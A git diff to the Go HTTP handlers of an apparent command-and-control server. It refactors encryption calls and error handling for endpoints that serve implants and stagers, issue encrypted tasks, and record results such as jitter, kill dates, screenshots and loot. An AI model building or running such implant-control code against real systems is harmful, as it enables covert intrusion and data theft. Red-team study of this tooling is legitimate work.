@@ -181,7 +181,12 @@ func handleImplantDownload(database *db.Database) gin.HandlerFunc {
 			return
 		}
 		// Encrypt the data
-		dataEnc := crypt.EncryptData(data)
+		dataEnc, err := crypt.Encrypt(data)
+		if err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			w.(http.Flusher).Flush()
+			return
+		}
 
 		// Send chunked data
 		w.WriteHeader(http.StatusOK)
@@ -236,9 +241,13 @@ func handleImplantTaskGet(database *db.Database) gin.HandlerFunc {
 		}
 
 		// Encrypt the task
-		encTask := crypt.Encrypt(currTask)
+		encTask, err := crypt.Encrypt([]byte(currTask))
+		if err != nil {
+			ctx.String(http.StatusBadRequest, "Error: Failed to encrypt the task.")
+			return
+		}
 
-		ctx.String(http.StatusOK, encTask)
+		ctx.String(http.StatusOK, string(encTask))
 	}
 	return gin.HandlerFunc(fn)
 }
@@ -250,7 +259,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 
 		ags, err := database.AgentGetAll()
 		if err != nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Error: Failed to get all agents.")
 			return
 		}
 
@@ -262,21 +271,9 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			}
 		}
 		if targetAgent == nil {
-			ctx.String(http.StatusBadRequest, "")
+			ctx.String(http.StatusBadRequest, "Error: Failed to get target agent.")
 			return
 		}
-
-		// Get task
-		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
-		// Decrypt
-		task, err := crypt.Decrypt(taskEnc)
-		if err != nil {
-			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
-			return
-		}
-		// Parse JSON
-		var taskJSON _task.Task
-		json.Unmarshal([]byte(task), &taskJSON)
 
 		// Get result data (encrypted).
 		dataEnc, err := ctx.GetRawData()
@@ -285,7 +282,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			return
 		}
 		// Decrypt task result.
-		dataDecStr, err := crypt.Decrypt(string(dataEnc))
+		dataDec, err := crypt.Decrypt([]byte(dataEnc))
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Failed to decrypt the task result.")
 			return
@@ -293,15 +290,16 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 
 		// Parse JSON
 		var taskResult _task.TaskResult
-		if dataDecStr != "" {
-			if err := json.Unmarshal([]byte(dataDecStr), &taskResult); err != nil {
+		if len(dataDec) > 0 {
+			if err := json.Unmarshal(dataDec, &taskResult); err != nil {
 				ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
 				return
 			}
 		}
 
 		content := ""
-		switch taskJSON.Command.Code {
+		switch taskResult.Task.Command.Code {
+		// switch taskJSON.Command.Code {
 		case _task.TASK_CONNECT:
 			// Update listener URL of the agent on the database.
 			targetAgent.ListenerURL = taskResult.Result
@@ -312,7 +310,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			downloadPath := taskResult.Result
 			content = fmt.Sprintf("Downloaded at %s", downloadPath)
 		case _task.TASK_JITTER:
-			timeStr := taskJSON.Args["time"]
+			timeStr := taskResult.Task.Args["time"]
 			time, err := strconv.ParseUint(timeStr, 10, 64)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
@@ -327,7 +325,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			}
 			content = "The jitter time has been updated."
 		case _task.TASK_KILLDATE:
-			dtStr := taskJSON.Args["datetime"]
+			dtStr := taskResult.Task.Args["datetime"]
 			dt, err := strconv.ParseUint(dtStr, 10, 64)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
@@ -356,7 +354,7 @@ func handleImplantTaskResult(database *db.Database) gin.HandlerFunc {
 			}
 			content = fmt.Sprintf("Saved file under %s/screenshots", agLootDir)
 		case _task.TASK_SLEEP:
-			timeStr := taskJSON.Args["time"]
+			timeStr := taskResult.Task.Args["time"]
 			time, err := strconv.ParseUint(timeStr, 10, 64)
 			if err != nil {
 				ctx.String(http.StatusBadRequest, "")
@@ -423,7 +421,7 @@ func handleImplantUpload(database *db.Database) gin.HandlerFunc {
 			return
 		}
 		// Decrypt
-		data, err := crypt.DecryptData(dataEnc)
+		data, err := crypt.Decrypt(dataEnc)
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "")
 			return
@@ -432,14 +430,14 @@ func handleImplantUpload(database *db.Database) gin.HandlerFunc {
 		// Get task
 		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
 		// Decrypt
-		task, err := crypt.Decrypt(taskEnc)
+		task, err := crypt.Decrypt([]byte(taskEnc))
 		if err != nil {
 			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
 			return
 		}
 		// Parse JSON
 		var taskJSON _task.Task
-		json.Unmarshal([]byte(task), &taskJSON)
+		json.Unmarshal(task, &taskJSON)
 
 		if taskJSON.Command.Code == _task.TASK_DOWNLOAD {
 			// Get the download path
@@ -598,7 +596,12 @@ func handleStagerDownload(lis *listener.Listener) gin.HandlerFunc {
 			return
 		}
 		// Encrypt the data
-		dataEnc := crypt.EncryptData(data)
+		dataEnc, err := crypt.Encrypt(data)
+		if err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			w.(http.Flusher).Flush()
+			return
+		}
 
 		// Send chunked data
 		w.WriteHeader(http.StatusOK)
